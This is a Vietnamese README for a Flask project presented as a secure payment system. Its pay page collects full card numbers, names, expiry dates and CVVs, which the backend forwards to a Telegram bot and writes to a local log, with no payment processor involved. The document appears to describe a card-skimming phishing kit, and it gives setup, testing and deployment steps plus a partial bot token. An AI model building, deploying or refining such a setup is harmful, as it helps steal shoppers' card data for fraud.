# 💳 Payment Backend System

Hệ thống thanh toán an toàn với Flask backend để bảo mật token Telegram Bot.

## 📁 Cấu trúc project

```
payment-backend-project/
│
├── backend/
│   ├── app.py              # Flask server
│   ├── requirements.txt    # Python dependencies
│   ├── .env               # Token Telegram (BẢO MẬT)
│   └── .env.example       # Template
│
├── frontend/
│   ├── home.html          # Trang chủ
│   ├── story.html         # Trang câu chuyện
│   ├── shipping.html      # Trang giao hàng
│   └── pay.html           # Trang thanh toán (✨ ĐÃ SỬA)
│
├── .gitignore             # Bảo vệ file nhạy cảm
├── README.md              # File này
└── QUICKSTART.txt         # Hướng dẫn chạy nhanh
```

## 🚀 Cài đặt và chạy

### Bước 1: Tạo môi trường ảo Python

**Windows:**
```bash
cd backend
python -m venv venv
venv\Scripts\activate
```

**Linux/Mac:**
```bash
cd backend
python3 -m venv venv
source venv/bin/activate
```

### Bước 2: Cài đặt dependencies
```bash
pip install -r requirements.txt
```

### Bước 3: Chạy server
```bash
python app.py
```

Server sẽ chạy tại: **http://localhost:5000**

## 🧪 Test

1. Mở trình duyệt: `http://localhost:5000`
2. Click vào "Payment - Thanh toán"
3. Điền thông tin test:
   - Card number: `4532 1234 5678 9010`
   - Name: `NGUYEN VAN A`
   - Expiration: `12/2025`
   - CVV: `123`
4. Submit và check Telegram bot

## 🔒 Bảo mật

### ❌ Trước (Không an toàn):
```javascript
// Token lộ trong code frontend!
const botToken = "8300477972:AAE...";
fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, ...);
```

### ✅ Sau (An toàn):
```javascript
// Không có token, chỉ gọi backend API
const BACKEND_API_URL = 'http://localhost:5000/api/send-payment';
fetch(BACKEND_API_URL, {
    method: 'POST',
    body: JSON.stringify(data)
});
```

## 📊 API Endpoints

### `GET /`
- Trả về trang home.html

### `GET /api/health`
- Health check
- Response: `{"status": "healthy", "timestamp": "..."}`

### `POST /api/send-payment`
- Gửi thông tin thanh toán đến Telegram
- Body:
```json
{
    "cardNumber": "4532 1234 5678 9010",
    "cardName": "NGUYEN VAN A",
    "expirationDate": "12/25",
    "securityCode": "123"
}
```
- Response: `{"success": true, "message": "..."}`

## 🌐 Deploy lên Production

Khi deploy, sửa URL trong `frontend/pay.html`:

```javascript
// Localhost
const BACKEND_API_URL = 'http://localhost:5000/api/send-payment';

// Production (ví dụ)
const BACKEND_API_URL = 'https://your-domain.com/api/send-payment';
```

### Deploy với Heroku:
```bash
heroku create your-app-name
heroku config:set TELEGRAM_BOT_TOKEN=your_token
heroku config:set TELEGRAM_CHAT_ID=your_chat_id
git push heroku main
```

### Deploy với Railway:
1. Tạo tài khoản tại railway.app
2. Connect GitHub repository
3. Set environment variables
4. Deploy tự động

## 🐛 Troubleshooting

**Lỗi: "ModuleNotFoundError"**
```bash
pip install -r backend/requirements.txt
```

**Lỗi: "Port 5000 already in use"**

Windows:
```bash
netstat -ano | findstr :5000
taskkill /PID <PID> /F
```

Linux/Mac:
```bash
lsof -ti:5000 | xargs kill -9
```

**Lỗi: "CORS error"**
- Reload trang (Ctrl + Shift + R)
- Kiểm tra `CORS(app)` trong app.py

## 📝 Log

Log được lưu tại: `backend/orders.log`

Xem realtime:
```bash
tail -f backend/orders.log
```

## ⚠️ Lưu ý

- ❌ **KHÔNG BAO GIỜ** commit file `.env` lên Git
- ✅ File `.env` đã được bảo vệ bởi `.gitignore`
- ✅ Token chỉ tồn tại trên server, không lộ ra frontend

## 📞 Support

Nếu gặp vấn đề:
1. Check log: `backend/orders.log`
2. Check browser console (F12)
3. Check terminal đang chạy Flask

## ⚖️ License

MIT License - Sử dụng tự do

---

Made with ❤️ by Flask + Python
